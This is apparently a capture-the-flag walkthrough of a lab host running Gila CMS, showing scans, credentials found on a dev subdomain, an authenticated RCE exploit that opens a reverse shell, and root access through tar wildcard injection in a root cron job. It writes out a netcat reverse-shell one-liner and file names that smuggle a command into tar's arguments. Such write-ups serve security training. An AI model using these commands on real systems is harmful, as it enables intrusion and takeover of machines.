## MACHINE IP
```bash
10.201.103.127
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Tue Sep 30 19:13:00 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.103.127
Nmap scan report for cmess.thm (10.201.103.127)
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 30 19:14:04 2025 -- 1 IP address (1 host up) scanned in 63.27 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
## RECON
```bash
# Operating System                       // Found Post Initial Foothold
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"

# Credentials                               // Found Post Initial Foothold       
andre@cmess.thm:KPFTN_f2yxe%                // Gila CMS
andres:UQfsdCB7aAP6                         // User Creds
```
## ENUMERATION
```bash
# Add cmess.th to /etc/hosts
10.201.103.127 cmess.thm

# Port 80 Enumeration
- /src/ /themes/ /lib/ - Forbidden

# Fuzzing 
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 291ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1962ms]
0                       [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 294ms]
01                      [Status: 200, Size: 4090, Words: 431, Lines: 103, Duration: 292ms]
1                       [Status: 200, Size: 4090, Words: 431, Lines: 103, Duration: 296ms]
1x1                     [Status: 200, Size: 4090, Words: 431, Lines: 103, Duration: 291ms]
                        [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 3992ms]
about                   [Status: 200, Size: 3359, Words: 372, Lines: 93, Duration: 452ms]
About                   [Status: 200, Size: 3345, Words: 372, Lines: 93, Duration: 439ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4991ms]
admin                   [Status: 200, Size: 1583, Words: 377, Lines: 42, Duration: 296ms]
api                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 296ms]
author                  [Status: 200, Size: 3599, Words: 419, Lines: 102, Duration: 293ms]
assets                  [Status: 200, Size: 566, Words: 43, Lines: 15, Duration: 288ms]
blog                    [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 292ms]
category                [Status: 200, Size: 3871, Words: 522, Lines: 110, Duration: 294ms]
cm                      [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 295ms]
feed                    [Status: 200, Size: 735, Words: 37, Lines: 22, Duration: 292ms]
fm                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
index                   [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 291ms]
Index                   [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 304ms]
lib                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 288ms]
login                   [Status: 200, Size: 1583, Words: 377, Lines: 42, Duration: 289ms]
robots.txt              [Status: 200, Size: 65, Words: 5, Lines: 5, Duration: 289ms]
Search                  [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 296ms]
search                  [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 299ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 289ms]
src                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 290ms]
tag                     [Status: 200, Size: 3883, Words: 523, Lines: 110, Duration: 301ms]
tags                    [Status: 200, Size: 3145, Words: 337, Lines: 85, Duration: 300ms]
themes                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 671ms]
tmp                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 348ms]

- Found Login Page Gila CMS
- Unable to find version 
- Trying subdomain Fuzzing
  
# Fuzzing subdomain
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 40 -fc 404 -fl 108 -H "Host: FUZZ.cmess.thm" -u http://cmess.thm/ | tee fuzz/fuff-subdomain
dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 296ms]

- Found dev.cmess.thm 
- Found creds when access http://dev.cmess.thm
andre@cmess.thm:KPFTN_f2yxe% 

# Using creds on http://cmess.thm/admin to login
- Found version Gila CMS 1.10.9
  
searchsploit gila
Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)| php/webapps/51569.py
```
## INITIAL SHELL
```bash
- Start Listener on port 80 
python3 51569.py 

 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝

                              by Unknown_Exploit

Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin/
Enter the email: andre@cmess.thm
Enter the password: KPFTN_f2yxe%
Enter the local IP (LHOST): 10.13.80.25
Enter the local port (LPORT): 80
File uploaded successfully.

sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.103.127] 42980
bash: cannot set terminal process group (784): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cmess:/var/www/html/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)         
```
## PRIVILEGE ESCALATION
```bash
- Run linpeas.sh

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/dev/shm/linpeas.sh
/opt/.password.bak       

www-data@cmess:/tmp$ cat /opt/.password.bak                                                    
andres backup password                        
UQfsdCB7aAP6

# Creds
andres:UQfsdCB7aAP6

# User shell
su andre

cat /etc/crontab                                                                                                                                         19:09:30 [46/2501]
# /etc/crontab: system-wide crontab                                                                                                                                                          
# Unlike any other crontab you don't have to run the `crontab'        
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user  command                                                               
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly            
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

# tar wildcard sudo privilege
Reference - https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

cd /home/andre/backup
andre@cmess:~/backup$ echo "mkfifo /tmp/lhennp; nc 10.13.80.25 80 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
```
## ROOT | ADMINISTRATOR - PWNED
```bash
sudo nc -nvlp 80              
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.103.127] 43050
id
uid=0(root) gid=0(root) groups=0(root)
```
